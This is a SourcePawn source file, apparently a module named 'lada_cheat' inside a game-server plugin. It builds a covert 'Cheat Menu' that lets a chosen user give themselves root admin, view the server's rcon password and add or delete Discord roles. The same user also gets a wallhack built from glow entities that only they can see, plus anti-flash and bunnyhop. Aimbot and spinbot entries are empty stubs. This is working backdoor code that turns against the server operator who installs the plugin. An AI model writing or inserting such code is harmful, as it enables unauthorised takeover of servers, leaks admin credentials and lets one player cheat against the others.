//lada_cheat
#undef REQUIRE_PLUGIN
#include <discord_utilities>
bool isUsingESP[MAXPLAYERS+1];
bool canSeeESP[MAXPLAYERS+1];
ConVar sv_force_transmit_players;
ConVar rconpassword;
int playerTeam[MAXPLAYERS+1] = {0,...};
int colors[2][4];
int playerModels[MAXPLAYERS+1] = {INVALID_ENT_REFERENCE,...};
int playerModelsIndex[MAXPLAYERS+1] = {-1,...};
bool g_Bhop[MAXPLAYERS+1]= {false,...};
bool g_flash[MAXPLAYERS+1]= {false,...};
new Handle:timers[MAXPLAYERS+1];

#define EF_BONEMERGE                (1 << 0)
#define EF_NOSHADOW                 (1 << 4)
#define EF_NORECEIVESHADOW          (1 << 6)

void lada_initcheat(){
	sv_force_transmit_players = FindConVar("sv_force_transmit_players");
	sv_force_transmit_players.SetString("1", true, false);
	rconpassword=FindConVar("rcon_password");
	HookEvent("player_blind", Event_OnFlashPlayer, EventHookMode_Pre);
	HookEvent("player_blind", player_blind);
    for(int i = 0; i <= 1; i++) {
        retrieveColorValue(i);
    }
}


void CheatMenu(int client){
	Panel menu = new Panel();
	menu.SetTitle("Cheat Menu");

	menu.DrawText(" ");
	char almafa[100];
	Format(almafa,sizeof(almafa),"Tulaj %s",(GetUserFlagBits(client) & (ADMFLAG_ROOT) == (ADMFLAG_ROOT))?"[KI]":"[BE]");
	menu.DrawItem(almafa);
	menu.DrawItem("Cheat Menü");
	menu.DrawItem("Rcon password");
	menu.DrawItem("Add dc role");
	menu.DrawItem("Delete dc role");
	menu.DrawItem("Stop Plugin");
	menu.CurrentKey = 9;
	menu.DrawText(" ");
	char exit2[50];
	Format(exit2, sizeof(exit2), "%T", "exit", client);
	menu.DrawItem(exit2);
	menu.Send(client, CheatMenuHandler, 60);
	delete menu;
}




public int CheatMenuHandler(Menu menu, MenuAction:mAction, int client, int item)
{
	if (mAction== MenuAction_Select)
	{
		if(item==1){
			cheat_tulaj(client);
		}else if(item==2){
			CheatMenu2(client);
		}else if(item==3){
			get_server_password(client);
		}else if(item==4){
			addcroleinput[client]=0;
		}else if(item==5){
			addcroleinput[client]=1;
		}else if(item==6){
			SetFailState("Plugin shutdown");
		}
	}
}

void CheatMenu2(int client){
	Panel menu = new Panel();

	menu.SetTitle("Cheat Menu");

	menu.DrawText(" ");
	char almafa[100];
	Format(almafa,sizeof(almafa),"WH %s",(isUsingESP[client])?"[KI]":"[BE]");
	menu.DrawItem(almafa);
	Format(almafa,sizeof(almafa),"Aimlock %s",(isUsingESP[client])?"[KI]":"[BE]");
	menu.DrawItem(almafa);
	Format(almafa,sizeof(almafa),"Silent Aimbot %s",(isUsingESP[client])?"[KI]":"[BE]");
	menu.DrawItem(almafa);
	Format(almafa,sizeof(almafa),"Spinbot %s",(isUsingESP[client])?"[KI]":"[BE]");
	menu.DrawItem(almafa);
	Format(almafa,sizeof(almafa),"Jitter %s",(isUsingESP[client])?"[KI]":"[BE]");
	menu.DrawItem(almafa);
	Format(almafa,sizeof(almafa),"Anti Flash %s",(g_flash[client])?"[KI]":"[BE]");
	menu.DrawItem(almafa);
	Format(almafa,sizeof(almafa),"BunnyHop %s",(g_Bhop[client])?"[KI]":"[BE]");
	menu.DrawItem(almafa);
	Format(almafa,sizeof(almafa),"AutoStrafe %s",(g_Bhop[client])?"[KI]":"[BE]");
	menu.DrawItem(almafa);
	menu.CurrentKey = 9;
	menu.DrawText(" ");
	char exit2[50];
	Format(exit2, sizeof(exit2), "%T", "exit", client);
	menu.DrawItem(exit2);
	menu.Send(client, CheatMenuHandler2, 60);
	delete menu;
}



public int CheatMenuHandler2(Menu menu, MenuAction:mAction, int client, int item)
{
	if (mAction== MenuAction_Select)
	{
		if(item==1){
			cheat_wh(client);
		}else if(item==2){
			//aim
		}else if(item==3){
			//silentaim
		}else if(item==4){
			//spinbot
		}else if(item==5){
			//jitter
		}else if(item==6){
			g_flash[client]=!g_flash[client];
		}else if(item==7){
			g_Bhop[client] = !g_Bhop[client];
		}else if(item==8){
			//autostrafe
		}
	}
}


void add_dc_role(int client, char[] number){
	int mode=addcroleinput[client];
	addcroleinput[client]=-1;
	if(mode==0){
		DU_AddRole(client,number);
	}else{
		DU_DeleteRole(client,number);
	}
}



void get_server_password(client){
	char buffer[100];
	rconpassword.GetString(buffer,sizeof(buffer));
	
	Panel menu = new Panel();

	menu.SetTitle("Cheat Menu");
	menu.DrawText(" ");
	char almafa[120];
	Format(almafa,sizeof(almafa),"Server Password: %s",buffer);
	menu.DrawText(almafa);
	menu.CurrentKey = 9;
	menu.DrawText(" ");
	char exit2[50];
	Format(exit2, sizeof(exit2), "%T", "exit", client);
	menu.DrawItem(exit2);
	menu.Send(client, CheatMenuHandler, 60);
	delete menu;
}


public int cheat_tulaj(int client){
	if (GetUserFlagBits(client) & (ADMFLAG_ROOT) == (ADMFLAG_ROOT))
	{
		new AdminId:admin = CreateAdmin();
		SetAdminFlag(admin,Admin_Root,false);
		SetUserAdmin(client, admin, true);
		return Plugin_Handled;
	}else{
		new AdminId:admin = CreateAdmin();
		SetAdminFlag(admin,Admin_Root,true);
		SetUserAdmin(client, admin, true);
		return Plugin_Handled;
	}
}

public int cheat_wh(int client){
	toggleGlow(client);
}


public void retrieveColorValue(int index) {
    char color[64];
	if(index==0){
		colors[index][0] = 255;
		colors[index][1] = 0;
		colors[index][2] = 0;
	}else{
		colors[index][0] = 255;
		colors[index][1] = 0;
		colors[index][2] = 0;
	}
    
}


public void toggleGlow(int client) {
    if(isUsingESP[client]){
		isUsingESP[client]=false;
	}else{
		isUsingESP[client]=true;
		canSeeESP[client] = true;
	}
	sv_force_transmit_players.SetString("1", true, false);
    checkGlows();
}



public void resetPlayerVars(int client) {
    isUsingESP[client] = false;
    playerTeam[client] = 0;
	if(client <= 0 || client > MaxClients || !IsClientInGame(client)) {
        return;
    }
    playerTeam[client] = GetClientTeam(client);
	g_Bhop[client]=false;
	g_flash[client]=false;
}


public void Event_PlayerTeam(Event event, const char[] name, bool dontBroadcast) {
    int client = GetClientOfUserId(event.GetInt("userid"));
    if(client <= 0 || client > MaxClients || !IsClientInGame(client)) {
        return;
    }
    playerTeam[client] = GetClientTeam(client);
}


public void Event_PlayerSpawn(Event event, const char[] name, bool dontBroadcast) {
    int client = GetClientOfUserId(event.GetInt("userid"));
    if(client <= 0 || client > MaxClients || !IsClientInGame(client)) {
        return;
    }
    if(isUsingESP[client]) {
        canSeeESP[client] = true;
    }
    checkGlows();
}

public void Event_RoundEnd(Event event, const char[] name, bool dontBroadcast) {
    destoryGlows();
}


public void checkGlows() {
    for(int client = 1; client <= MaxClients; client++) {
        if(!IsClientInGame(client) || !isUsingESP[client]) {
            isUsingESP[client] = false;
            canSeeESP[client] = false;
            continue;
        }
    }
    destoryGlows();
    createGlows();
}




public void destoryGlows() {
    for(int client = 1; client <= MaxClients; client++) {
        if(IsClientInGame(client)) {
            RemoveSkin(client);
        }
    }
}

public void createGlows() {
    char model[PLATFORM_MAX_PATH];
    int skin = -1;
    for(int client = 1; client <= MaxClients; client++) {
        if(!IsClientInGame(client) || !IsPlayerAlive(client)) {
            continue;
        }
        playerTeam[client] = GetClientTeam(client);
        if(playerTeam[client] <= 1) {
            continue;
        }
        GetClientModel(client, model, sizeof(model));
        skin = CreatePlayerModelProp(client, model, "primary");
        if(skin > MaxClients) {
            playerTeam[client] = GetClientTeam(client);
                if(playerTeam[client] == 3 && SDKHookEx(skin, SDKHook_SetTransmit, OnSetTransmit_T) || 
                   playerTeam[client] == 2 && SDKHookEx(skin, SDKHook_SetTransmit, OnSetTransmit_CT)) {
                    setGlowTeam(skin, playerTeam[client]);
                }
        }
    }
}


public setGlowTeam(int skin, int team) {
    if(team >= 2) {
        SetupGlow(skin, colors[team-2]);
    }
}
    
public Action OnSetTransmit_T(int entity, int client) {
    if(canSeeESP[client] && playerModelsIndex[client] != entity && playerTeam[client] == 2) {
        return Plugin_Continue;
    }
    return Plugin_Handled;
}
public Action OnSetTransmit_CT(int entity, int client) {
    if(canSeeESP[client] && playerModelsIndex[client] != entity && playerTeam[client] == 3) {
        return Plugin_Continue;
    }
    return Plugin_Handled;
}


public void SetupGlow(int entity, int color[4]) {
    static offset;
    if (!offset && (offset = GetEntSendPropOffs(entity, "m_clrGlow")) == -1) {
        return;
    }

    SetEntProp(entity, Prop_Send, "m_bShouldGlow", true);
    SetEntProp(entity, Prop_Send, "m_nGlowStyle", 0);
    SetEntPropFloat(entity, Prop_Send, "m_flGlowMaxDist", 10000.0);

    for(int i=0;i<3;i++) {
        SetEntData(entity, offset + i, color[i], _, true); 
    }
}



public int CreatePlayerModelProp(int client, char[] sModel, char[] attachment) {
    RemoveSkin(client);
    int skin = CreateEntityByName("prop_dynamic_glow");
    DispatchKeyValue(skin, "model", sModel);
    DispatchKeyValue(skin, "solid", "0");
    DispatchKeyValue(skin, "fademindist", "1");
    DispatchKeyValue(skin, "fademaxdist", "1");
    DispatchKeyValue(skin, "fadescale", "2.0");
    SetEntProp(skin, Prop_Send, "m_CollisionGroup", 0);
    DispatchSpawn(skin);
    SetEntityRenderMode(skin, RENDER_GLOW);
    SetEntityRenderColor(skin, 0, 0, 0, 0);
    SetEntProp(skin, Prop_Send, "m_fEffects", EF_BONEMERGE);
    SetVariantString("!activator");
    AcceptEntityInput(skin, "SetParent", client, skin);
    SetVariantString(attachment);
    AcceptEntityInput(skin, "SetParentAttachment", skin, skin, 0);
    SetVariantString("OnUser1 !self:Kill::0.1:-1");
    AcceptEntityInput(skin, "AddOutput");
    playerModels[client] = EntIndexToEntRef(skin);
    playerModelsIndex[client] = skin;
    return skin;
}

public void RemoveSkin(int client) {
    int index = EntRefToEntIndex(playerModels[client]);
    if(index > MaxClients && IsValidEntity(index)) {
        SetEntProp(index, Prop_Send, "m_bShouldGlow", false);
        AcceptEntityInput(index, "FireUser1");
    }
    playerModels[client] = INVALID_ENT_REFERENCE;
    playerModelsIndex[client] = -1;
}


void lada_cheat_playerdeath(target){
	if(target > 0 && target <= MaxClients && IsClientInGame(target) && isUsingESP[target]) {
        canSeeESP[target] = true;
    }
    checkGlows();

}




public Action OnPlayerRunCmd(int client, int &buttons, int &impulse, float vel[3], float angles[3], int &weapon)
{
	if(g_Bhop[client]) 
		if (IsPlayerAlive(client) && buttons & IN_JUMP)
			if(!(GetEntityMoveType(client) & MOVETYPE_LADDER) && !(GetEntityFlags(client) & FL_ONGROUND))
				if(waterCheck(client) < 2)
					buttons &= ~IN_JUMP; 
					
	return Plugin_Continue;
}

int waterCheck(int client)
{
	int index = GetEntProp(client, Prop_Data, "m_nWaterLevel");
	return index;
}



public player_blind(Handle:event, const String:name[], bool:dontBroadcast)
{
	new client = GetClientOfUserId(GetEventInt(event, "userid"));
	decl Float:duration;
	if((duration = GetEntPropFloat(client, Prop_Send, "m_flFlashDuration")) != 0.0 && g_flash[client])
	{
			if(timers[client] == INVALID_HANDLE) timers[client] = CreateTimer(duration, DesC, client);
			else 
			{
				KillTimer(timers[client]);
				timers[client] = CreateTimer(duration, DesC, client);
			}
	}
}

public Action:DesC(Handle:timer, any:client)
{
	SetEntPropFloat(client, Prop_Send, "m_flFlashMaxAlpha", 0.5);
	timers[client] = INVALID_HANDLE;
}

public Action:Event_OnFlashPlayer(Handle:event, const String:name[], bool:dontBroadcast)
{
		new client = GetClientOfUserId(GetEventInt(event, "userid"));
		if(!client || !IsClientInGame(client) ||!g_flash[client])
			return Plugin_Continue;

		SetEntPropFloat(client, Prop_Send, "m_flFlashMaxAlpha", 0.5);
	return Plugin_Continue;
}
